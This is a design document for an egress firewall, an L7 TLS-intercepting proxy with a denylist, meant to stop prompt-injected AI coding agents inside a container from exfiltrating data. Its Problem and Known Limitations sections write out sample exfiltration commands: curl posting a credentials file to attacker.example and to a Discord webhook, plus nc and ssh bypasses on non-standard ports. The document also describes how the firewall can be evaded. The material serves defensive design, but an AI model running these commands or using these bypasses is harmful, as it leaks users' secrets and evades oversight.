# Design: Network Egress Firewall (L7 TLS-MITM Proxy, Denylist-First)

**Date:** 2026-04-20
**Status:** Draft
**Decisions:** [ADR-012](decisions/ADR-012-egress-firewall.md)
**Origin:** Beads `rip-cage-2py`, informed by [ClaudeBox comparison](../history/2026-04-17-claudebox-comparison.md)
**Supersedes:** [2026-04-17-egress-firewall-design.md](2026-04-17-egress-firewall-design.md)

---

## Problem

Rip-cage's safety stack (DCG, compound command blocker, PreToolUse hooks) catches destructive shell commands but has no visibility into network egress. A prompt-injected agent can still run `curl -X POST https://attacker.example/ -d @~/.claude/.credentials.json` or `curl https://discord.com/api/webhooks/… -d "$(cat /workspace/**)"` — credentials, source code, and environment data exfiltrate in one HTTP request. This is MITRE T1567.004 (Exfiltration over Webhook), widely reported in the AI-agent security literature.

The previous design investigation (2026-04-17) landed on opt-in L3/L4 iptables allowlists, the ClaudeBox/Anthropic reference pattern. Further thinking revealed two problems: (1) allowlists are per-project config friction that most users will skip, defaulting to zero protection; (2) iptables can't distinguish `GET /gist/abc` (reading a known snippet — fine) from `POST /gist/new` (publishing stolen data — exfil). The interesting exfil channels are all HTTP method + host + path tuples, not raw IPs.

## Goal

A small, curated, always-on egress firewall — **"network DCG"** — that blocks known exfiltration channels by default, with no per-project config, method-aware rules, and full compatibility with Anthropic's documented enterprise-proxy setup.

## Non-Goals

- **User-editable allowlists or per-project overrides.** Binary on/off, matching DCG's philosophy.
- **Airtight exfil prevention.** Users with creative agents can still leak via allowed hosts (confused deputy via gists, DNS-encoded data, etc.). This is defense-in-depth, not a seal.
- **Blocking non-standard ports.** The firewall intercepts ports 80/443 only. Exfiltration via non-standard ports (8443, SSH, raw TCP) is out of scope — see Known Limitations.
- **DNS-level filtering beyond DoH blocking.** Port-53 UDP and known DoH endpoints are blocked; no general DNS inspection.
- **Logging allowed traffic.** Only denials are logged. Signal-dense audit trail.
- **Protecting against malicious host-side operators.** The firewall protects the user from the agent, not the agent from the user.

---

## Proposed Architecture

```
agent process (curl / node / python / …)
  │
  │ TCP SYN → :443 or :80
  ▼
iptables nat OUTPUT chain
  │ owner UID ≠ rip-proxy  → REDIRECT to :8080
  │ UDP :443 (HTTP/3/QUIC) → DROP (forces HTTP/2 fallback, all UIDs)
  ▼
mitmproxy (transparent mode, 127.0.0.1:8080)
  │ HTTPS: terminate TLS with rip-cage CA → inspect → re-originate TLS
  │ HTTP:  proxy plaintext transparently (auto-detected, no TLS termination)
  │ match (method, host, path) against denylist
  │  ├── allow → forward to real destination
  │  └── deny  → 403 with structured reason body (request() hook, pre-upstream)
  ▼
internet
```

One mode, applied uniformly. No special carve-outs, no pass-through tunnels. Anthropic traffic is MITM'd like everything else and falls through the default-allow rule — **same mechanism Anthropic officially supports for CrowdStrike Falcon and Zscaler** via `NODE_EXTRA_CA_CERTS` and `CLAUDE_CODE_CERT_STORE`.

### Component: CA cert trust

At container first-start time (not image build time), the root-phase init generates a per-container proxy CA keypair at `/etc/rip-cage/ca/`. This avoids baking a private key into the Docker image — important because the image may be published to GHCR (ADR-008 D6). Per-container generation means each container has a unique CA, eliminating shared-key MITM risk.

The init sequence:
1. Check if `/etc/rip-cage/ca/rip-cage-proxy-ca.pem` exists (persisted in a named volume or regenerated on create).
2. If not, generate a new CA keypair (`openssl req -x509 -newkey rsa:2048 -nodes ...`). ~1s on first start.
3. Install the public cert into `/usr/local/share/ca-certificates/rip-cage-proxy.crt` and run `update-ca-certificates`. This updates `/etc/ssl/certs/ca-certificates.crt` to include both system CAs and the proxy CA.
4. Set environment variables with correct semantics:
   - `NODE_EXTRA_CA_CERTS=/usr/local/share/ca-certificates/rip-cage-proxy.crt` — Node.js **appends** this to its built-in trust store.
   - `SSL_CERT_FILE=/etc/ssl/certs/ca-certificates.crt` — the **combined** system bundle (replaces, not appends).
   - `REQUESTS_CA_BUNDLE=/etc/ssl/certs/ca-certificates.crt` — the **combined** system bundle (replaces, not appends).
   - `CURL_CA_BUNDLE=/etc/ssl/certs/ca-certificates.crt` — the **combined** system bundle.

The distinction matters: `NODE_EXTRA_CA_CERTS` points to just the proxy CA cert (Node appends it). `SSL_CERT_FILE`, `REQUESTS_CA_BUNDLE`, and `CURL_CA_BUNDLE` must point to the combined bundle — pointing these to the proxy CA cert alone would break all HTTPS from Python/curl because system CAs (Let's Encrypt, DigiCert, etc.) would not be trusted.

Claude Code picks this up natively — Anthropic's enterprise network docs document exactly this setup for Zscaler/Falcon deployments. No special handling for `api.anthropic.com`.

### Component: iptables + REDIRECT

The root-phase init script (`init-firewall.sh`, run as root — see Init Sequence below) adds:
- `iptables -t nat -A OUTPUT -p tcp -m multiport --dports 443,80 -m owner ! --uid-owner rip-proxy -j REDIRECT --to-port 8080`
- `iptables -A OUTPUT -p udp --dport 443 -j DROP` (HTTP/3/QUIC — clients auto-fall-back to HTTP/2 over TCP. Applies container-wide to all UIDs including `rip-proxy`. Must be ordered before any future UDP allowlist rules.)
- Loopback and Docker DNS exempted.

REDIRECT (nat table, OUTPUT chain) is the correct mechanism for locally-originated traffic. TPROXY is designed for the PREROUTING chain to intercept forwarded/routed traffic and does not work on the OUTPUT chain within a container's network namespace. mitmproxy recovers the original destination via `SO_ORIGINAL_DST` getsockopt on the redirected connection.

The proxy runs as a dedicated UID `rip-proxy` (see below), excluded from the REDIRECT rule so its re-originated upstream traffic flows normally. **Fail-closed:** if the proxy crashes, iptables still redirects → agent gets `connection refused`, never silent bypass. A restart wrapper (`while true; do mitmdump ...; sleep 1; done`) ensures the proxy recovers automatically.

**Capability requirements:** `NET_ADMIN` is required on the container for iptables rules. This is a departure from the original "default capabilities only" baseline stated in the rip-cage design doc. The `agent` user cannot exercise `NET_ADMIN` because `iptables` is not in the scoped sudoers list (ADR-002 D12) — this is a relied-upon invariant. `CAP_NET_RAW` is required by the `rip-proxy` user for `SO_ORIGINAL_DST` getsockopt — this is included in Docker's default capability set. When `RIP_CAGE_EGRESS=off`, `NET_ADMIN` is not granted (see Escape Valve below).

### Component: rip-proxy system user

Created in the Dockerfile: `useradd -r -s /usr/sbin/nologin -M rip-proxy`. No login shell, no home directory, no sudo access. Used exclusively to run the mitmproxy process and to exclude proxy traffic from the iptables REDIRECT rule via `--uid-owner`.

### Component: Init sequence (two-phase)

Firewall setup requires root; the existing `init-rip-cage.sh` runs as the `agent` user. The design splits init into two phases:

**Phase 1 — Root (firewall):** `init-firewall.sh` at `/usr/local/lib/rip-cage/init-firewall.sh`, run as root.
1. Generate CA keypair if not present (see CA cert trust above).
2. Install cert and update trust store.
3. Apply iptables REDIRECT and UDP DROP rules.
4. Start mitmproxy as `rip-proxy` user via restart wrapper (backgrounded).
5. Verify proxy is listening on :8080 before returning.

**Phase 2 — Agent (existing):** `init-rip-cage.sh` at `/usr/local/bin/init-rip-cage.sh`, run as `agent`. Unchanged — handles auth, settings, hooks, git identity, beads.

**`rc up` path (CLI mode):**
- `_up_init_firewall`: `docker exec -u root "$name" /usr/local/lib/rip-cage/init-firewall.sh` — runs before `_up_init_container`.
- Applies on both the **create path** and the **resume path** — iptables rules in the nat table do not persist across `docker stop`/`docker start`.

**Devcontainer path (`rc init`):**
- Add a scoped sudoers entry: `agent ALL=(root) NOPASSWD: /usr/local/lib/rip-cage/init-firewall.sh`. This allows the agent user to invoke the specific init script but not arbitrary iptables commands — preserving ADR-002 D12's intent.
- Wire into `postStartCommand` in `devcontainer.json`: `sudo /usr/local/lib/rip-cage/init-firewall.sh`.

The agent user has no mechanism to modify firewall rules directly. The sudoers entry is scoped to one baked-in script, not to `iptables`.

### Component: mitmproxy with rule addon

Installed into a dedicated virtualenv at `/opt/rip-cage-proxy/` to avoid polluting the system Python's package namespace (the agent may use system Python for project work). Always installed — not a build-arg toggle — because the firewall is default-on (D6).

A Python addon loads `/etc/rip-cage/egress-rules.yaml` at proxy startup. For each request, it evaluates the `(method, host, path)` tuple against the denylist in the `request()` hook (pre-upstream — the upstream TCP connection is never established for denied requests). Three match primitives:

- `host` / `host_in` / `host_suffix`
- `path_prefix` / `path_regex`
- `method_in`

Default is `allow`. A matching `deny: true` rule returns an HTTP 403 with a structured body naming the rule ID, human reason, and override hint.

**Error handling (fail-closed):**
- **Startup:** Validate YAML schema on load. If the rule file is malformed or missing, refuse to start (the proxy does not run, iptables REDIRECT causes connection refused for all traffic — fail-closed).
- **Request evaluation:** Wrap rule matching in try/except. On any exception, deny the request with a 500-like error naming the exception class (fail-closed). Never pass through on error.

### Component: Rule file (baked, not user-editable)

```yaml
version: 1
default: allow
rules:
  - id: discord-webhooks
    deny: true
    match:
      host: "discord.com"
      path_prefix: "/api/webhooks/"
    reason: "Discord webhooks are a common exfiltration sink (MITRE T1567.004)"
    category: webhook-receiver
```

~35 entries across 7 CTI-backed categories:

| Category | Examples | Methods |
|---|---|---|
| Webhook receivers | `discord.com/api/webhooks`, `hooks.slack.com`, `api.telegram.org/bot*`, `webhook.site` | POST/PUT |
| OAST / pentest infra | `interact.sh`, `burpcollaborator.net`, `canarytokens.com`, request bins | all |
| Paste services | `pastebin.com`, `paste.ee`, `dpaste.com`, `ix.io`, `termbin.com` | POST/PUT |
| Anonymous file drops | `file.io`, `anonfiles`, `bashupload`, `catbox.moe`, `tmpfiles.org`, `0x0.st`, `transfer.sh` | POST/PUT |
| Tunnels | `*.ngrok.io`, `*.ngrok-free.app`, `*.trycloudflare.com`, `localhost.run`, `serveo.net`, `*.loca.lt` | all |
| Dynamic DNS | `*.duckdns.org`, `*.noip.com`, `*.dynu.net`, `*.hopto.org` | all |
| DoH resolvers | `dns.google/dns-query`, `cloudflare-dns.com/dns-query`, `*.nextdns.io` | all |

Method asymmetry is the key L7 payoff: reads from gists/pastes/httpbin stay allowed; publishes don't. Agent retains useful reach, exfil channels close.

GitHub Gist creation (`POST api.github.com/gists`) is intentionally **not** blocked despite being functionally a paste service — GitHub is a core dev dependency and blocking write operations to `github.com` would break normal agent workflows. This is a known dual-use gap, documented in Known Limitations.

### Component: User-visible UX

**Denial response to the agent:**
```
HTTP/1.1 403 Forbidden
X-Rip-Cage-Denied: discord-webhooks
Content-Type: text/plain

Blocked by rip-cage egress firewall.
Rule: discord-webhooks
Reason: Discord webhooks are a common exfiltration sink.
Override: set RIP_CAGE_EGRESS=off and restart the container.
Docs: https://github.com/jsnyde0/rip-cage/blob/main/docs/reference/egress-firewall.md
```

The shell client (curl, fetch, requests) surfaces a real 403 with a readable body — the agent self-corrects in-context, same pattern as DCG's deny messages.

**Audit log:** `/workspace/.rip-cage/egress.log`, JSONL, one line per denial. Schema: `timestamp`, `rule_id`, `method`, `host`, `path`, `client_uid`, `container_hostname`. The container hostname field disambiguates entries when multiple containers share a workspace (ADR-006 D2). Visible from the host via the bind mount without entering the container.

**`rc up` output:** one line, `✓ egress firewall active (35 rules, deny-list mode)`.

**Escape valve:** `RIP_CAGE_EGRESS=off` disables the firewall entirely. Read from the host environment at `rc up` time. When off:
- Skip `--cap-add=NET_ADMIN` on `docker run`.
- Skip root-phase firewall init (`init-firewall.sh` not executed).
- Proxy not started. Network unrestricted.
- Container labeled `rc.egress=off` so `rc ls` and tests can report the state.

When on (default): add `--cap-add=NET_ADMIN`, run root-phase init, start proxy.

Binary, no finer knobs. Matches `--dangerously-skip-dcg`. The setting is applied at container creation time. Changing it requires `rc destroy` + `rc up` — environment variables set at `docker run` time are immutable across `docker stop`/`docker start`.

**Health checks:** `rc test` gains egress firewall checks in `tests/test-egress-firewall.sh` (see Test Plan below).

---

## Key Design Decisions

See [ADR-012](decisions/ADR-012-egress-firewall.md) for full rationale and alternatives.

- **D1** Denylist-first, curated, not user-editable (FIRM)
- **D2** L7 TLS-MITM proxy over L3/L4 iptables-only (FIRM)
- **D3** mitmproxy as the proxy engine (FLEXIBLE)
- **D4** Uniform MITM, no Anthropic carve-out (FIRM — based on verified research)
- **D5** Proxy inside the container, not on the host (FIRM)
- **D6** Default-on, single env-var override (FIRM)
- **D7** Log denials only, not allows (FLEXIBLE)

---

## Consequences

**Easier:**
- Ship a meaningful safety upgrade without per-project config friction.
- Close the largest gap vs ClaudeBox (`rip-cage-2py`) with a stronger model than ClaudeBox's allowlist.
- Marketing story: "same enterprise-proxy mechanism CrowdStrike/Zscaler use" — credibility without novelty.

**Harder:**
- Per-container CA generation and cert-store management add complexity to the init sequence (~1s first-start overhead for key generation).
- `NET_ADMIN` capability required on the container — a departure from the "default capabilities only" baseline. NET_ADMIN grants the root user the ability to modify all network configuration. Mitigated: the agent user cannot exercise NET_ADMIN because `iptables` is not in the scoped sudoers list (ADR-002 D12). When `RIP_CAGE_EGRESS=off`, `NET_ADMIN` is not granted.
- mitmproxy adds ~40 MB to the image (Python runtime + deps in `/opt/rip-cage-proxy/`). Acceptable.
- First-run latency: ~10–15 ms added per HTTPS request. Imperceptible for interactive use; noticeable only in tight loops.
- Two-phase init (root + agent) adds complexity to both the `rc up` and devcontainer paths.

**Tradeoffs:**
- Curated denylist means some novel exfil channels won't be blocked until we add them. Accepted — we update the list in minor releases, same cadence as DCG.
- MITM breaks any process that pins certificates outside the system trust store. Near-zero risk in dev tooling (mainly a mobile-SDK concern); we document the escape valve for edge cases.
- HTTP/3 blocking forces fallback to HTTP/2 over TCP. Standard for TLS-inspecting proxies; all mainstream HTTP clients handle it transparently.

## Known Limitations

- **Non-standard port bypass.** The firewall only intercepts TCP ports 80 and 443. An agent can exfiltrate via HTTPS on non-standard ports (e.g., `curl https://attacker.example:8443/`), SSH (`ssh user@attacker.example`), or raw TCP (`nc attacker.example 12345`). This requires no cleverness — just a non-standard port. Expanding to all ports would introduce L3 allowlist behavior conflicting with D1 (FIRM). Accepted as a defense-in-depth boundary: the firewall blocks the most common exfil playbooks (standard-port webhooks, paste services, file drops) but does not claim to seal all channels.
- **Confused-deputy exfil via allowed hosts.** Posting a GitHub issue with stolen data in the body, creating a GitHub Gist (`POST api.github.com/gists`), or similar dual-use operations on core dev dependencies are not blocked. Would require content-aware inspection, out of scope.
- DNS tunneling (data encoded in DNS labels) not addressed beyond blocking DoH.
- Agents with shell access to `RIP_CAGE_EGRESS` env var inspection can detect firewall state — not a defense boundary, informational only.
- The "ordinary individual usage" Anthropic ToS clause (atypical throughput via containerized agents) is a rip-cage-wide concern orthogonal to the firewall; not addressed here. User's responsibility.

---

## Test Plan

New test script `tests/test-egress-firewall.sh` following the `check()` pattern from `test-safety-stack.sh`. Integrated into `rc test` via `cmd_test`. Tests require `NET_ADMIN` on the container.

**Checks (~8):**

1. **Proxy listening:** `curl -s http://127.0.0.1:8080/` responds (connection accepted).
2. **CA cert trusted:** `openssl s_client -connect api.anthropic.com:443 -CAfile /etc/ssl/certs/ca-certificates.crt` succeeds with the proxy CA in the chain.
3. **Known-denied request returns 403:** `curl -s -o /dev/null -w '%{http_code}' -X POST https://webhook.site/test` returns `403`.
4. **Known-allowed request succeeds:** `curl -s -o /dev/null -w '%{http_code}' https://api.github.com/` returns `200` or `403` (GitHub rate limit), not a TLS error.
5. **iptables rules present:** `sudo iptables -t nat -L OUTPUT -n` contains the REDIRECT rule for ports 80,443.
6. **Agent cannot flush rules:** `iptables -t nat -F OUTPUT` fails as the `agent` user (no sudo for iptables).
7. **Anthropic API connectivity (D4 regression):** `curl -sf https://api.anthropic.com/v1/messages` returns a valid HTTP response (not a TLS error) through the MITM proxy.
8. **JSONL log written on denial:** After the denied request in check 3, `/workspace/.rip-cage/egress.log` contains a JSONL entry with the correct `rule_id`.

**`RIP_CAGE_EGRESS=off` tests** (separate container or conditional):
- No iptables nat rules present.
- No proxy process running.
- Network unrestricted (direct HTTPS works without proxy CA).

## Open Questions

1. ~~**Cert rotation cadence.**~~ Resolved: per-container CA generation at first start. No private key baked into the image. No rotation needed — CA lifetime matches container lifetime.
2. **Statsig side effect.** Disabling Claude Code telemetry (which is allowed by default, not blocked) is user-reported to disable feature-gate fetching (loses 1M context). We aren't blocking telemetry — but document the interaction in the user-facing reference doc.
3. **Per-container proxy vs shared.** v1 is per-container (simplest, isolated). If multi-slot concurrent instances ever land, revisit shared-proxy model for memory efficiency.

## Validation

The prior iptables feasibility check (OrbStack 28.5.2, `/tmp/test-egress-firewall.sh`) confirmed `NET_ADMIN` + `iptables DROP` in-container works and that the non-root agent user cannot modify rules. The REDIRECT mechanism is an incremental validation on top of that baseline; to run before merge:

- mitmproxy transparent mode with REDIRECT handles upstream HTTP/2 cleanly for `api.anthropic.com` end-to-end with `NODE_EXTRA_CA_CERTS` set.
- `DISABLE_TELEMETRY` is **not** required — Statsig/Sentry flow through MITM normally.
- Known-denied request (`POST https://webhook.site/…`) returns 403 with structured body.
- `RIP_CAGE_EGRESS=off` path: no `NET_ADMIN` granted, no iptables rules, no proxy, network unrestricted.
- `SO_ORIGINAL_DST` getsockopt works for the `rip-proxy` user with Docker's default `CAP_NET_RAW`.

## References

- [ADR-012](decisions/ADR-012-egress-firewall.md) — companion decisions
- [ClaudeBox comparison](../history/2026-04-17-claudebox-comparison.md) — competitive gap analysis
- [Prior design (superseded)](2026-04-17-egress-firewall-design.md) — L3/L4 iptables-allowlist investigation
- [Anthropic enterprise network config](https://code.claude.com/docs/en/network-config) — `NODE_EXTRA_CA_CERTS`, `CLAUDE_CODE_CERT_STORE`, documented TLS-inspection support
- [MITRE T1567.004](https://attack.mitre.org/techniques/T1567/004/) — Exfiltration over Webhook
